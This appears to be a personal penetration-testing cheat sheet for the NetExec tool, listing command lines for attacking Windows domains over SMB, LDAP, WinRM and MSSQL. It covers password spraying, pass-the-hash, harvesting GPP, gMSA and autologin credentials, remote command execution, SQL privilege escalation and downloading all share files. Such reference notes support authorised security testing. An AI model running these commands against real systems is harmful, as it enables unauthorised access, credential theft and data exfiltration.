#ad #netexec #nxc #smb

# NetExec (nxc)

Swiss-army knife for SMB/WinRM/MSSQL/LDAP/SSH/RDP/FTP. Maintained successor to CrackMapExec (CME), which was archived in late 2023 — `nxc`'s flags are a near-exact match to the old `cme` syntax. Related: [enumeration](enumeration.md) · [ntlm-relay](ntlm-relay.md) · [kerberoasting](kerberoasting.md) · [password-attacks](../Passwords/password-attacks.md) · [tool-index](../Tools/tool-index.md) for install

## Connect / Authenticate
```bash
nxc <protocol> <target>
```
protocol = smb, winrm, mssql, ldap, ssh, rdp, ftp. Target = IP/DNS/CIDR/file.

```bash
nxc smb <target> -u <u> -p <p>
```
Domain authentication with a password.

```bash
nxc smb <target> -u <u> -H <ntlm_hash>
```
Pass-the-Hash authentication.

```bash
nxc smb <target> -u '' -p ''
```
Test anonymous/NULL-session logon.

```bash
nxc smb <target> -u <u> -p <p> --local-auth
```
Use local (non-domain) authentication.

```bash
nxc smb <target> -u <u> -p <p> --continue-on-success
```
Keep spraying after a valid credential is found.

```bash
nxc smb <target> -u <u> -p <p> --no-bruteforce
```
Pair each user with one password line-by-line (both must be files).

```bash
nxc smb <target> -u <u> -k
```
Force Kerberos authentication (requires FQDN).

## SMB Enumeration
```bash
nxc smb <target> --gen-relay-list output.txt
```
Save hosts with SMB signing off. See [ntlm-relay](ntlm-relay.md).

```bash
nxc smb <target> -u <u> -p <p> --shares
```
Enumerate share permissions.

```bash
nxc smb <target> -u <u> -p <p> --sessions
```
Enumerate active sessions.

```bash
nxc smb <target> -u <u> -p <p> --users
```
Enumerate domain users.

```bash
nxc smb <target> -u <u> -p <p> --rid-brute 10000
```
Enumerate users by RID brute-forcing (default 4000).

```bash
nxc smb <target> -u <u> -p <p> --loggedon-users
```
Enumerate logged-on users.

```bash
nxc smb <target> -u <u> -p <p> --pass-pol
```
Enumerate the domain password policy.

## LDAP Enumeration
```bash
nxc ldap <target> -u <u> -p <p> --password-not-required
```
List users with PASSWD_NOTREQD.

```bash
nxc ldap <target> -u <u> -p <p> --trusted-for-delegation
```
List accounts with TRUSTED_FOR_DELEGATION. See [kerberos-delegation](kerberos-delegation.md).

```bash
nxc ldap <target> -u <u> -p <p> --get-sid
```
Get the domain SID.

```bash
nxc ldap <target> -u <u> -p <p> --gmsa
```
Enumerate gMSA passwords.

## Credentialed Modules
```bash
nxc smb <target> -u <u> -p <p> -M gpp_password
```
Retrieve GPP cpassword from SYSVOL (MS14-025).

```bash
nxc smb <target> -u <u> -p <p> -M gpp_autologin
```
Find autologin creds in registry.xml.

## Command Execution
```bash
nxc smb <target> -u <u> -p <p> -x <command>
```
Execute a CMD command.

```bash
nxc smb <target> -u <u> -p <p> -X <command>
```
Execute a PowerShell command.

```bash
nxc winrm <target> -u <u> -p <p> -x <command>
```
Execute a command over WinRM.

## MSSQL
```bash
nxc mssql <target> -u <u> -p <p> -q <SQL_QUERY>
```
Run a SQL query.

```bash
nxc mssql <target> -u <u> -p <p> -x <command>
```
Run an OS command via xp_cmdshell. See [mssql-sccm](mssql-sccm.md).

```bash
nxc mssql <target> -u <u> -p <p> -M mssql_priv -o ACTION=privesc
```
Escalate a standard SQL user to sysadmin.

## File Ops / Spidering
```bash
nxc smb <target> -u <u> -p <p> --spider <share> --pattern <pattern>
```
Search a remote share for a pattern.

```bash
nxc smb <target> -u <u> -p <p> -M spider_plus -o READ_ONLY=false
```
Download all files from all shares.

## Export
```bash
nxc smb <target> -u <u> -p <p> --export $(pwd)/output.txt
```
Export output as JSON.
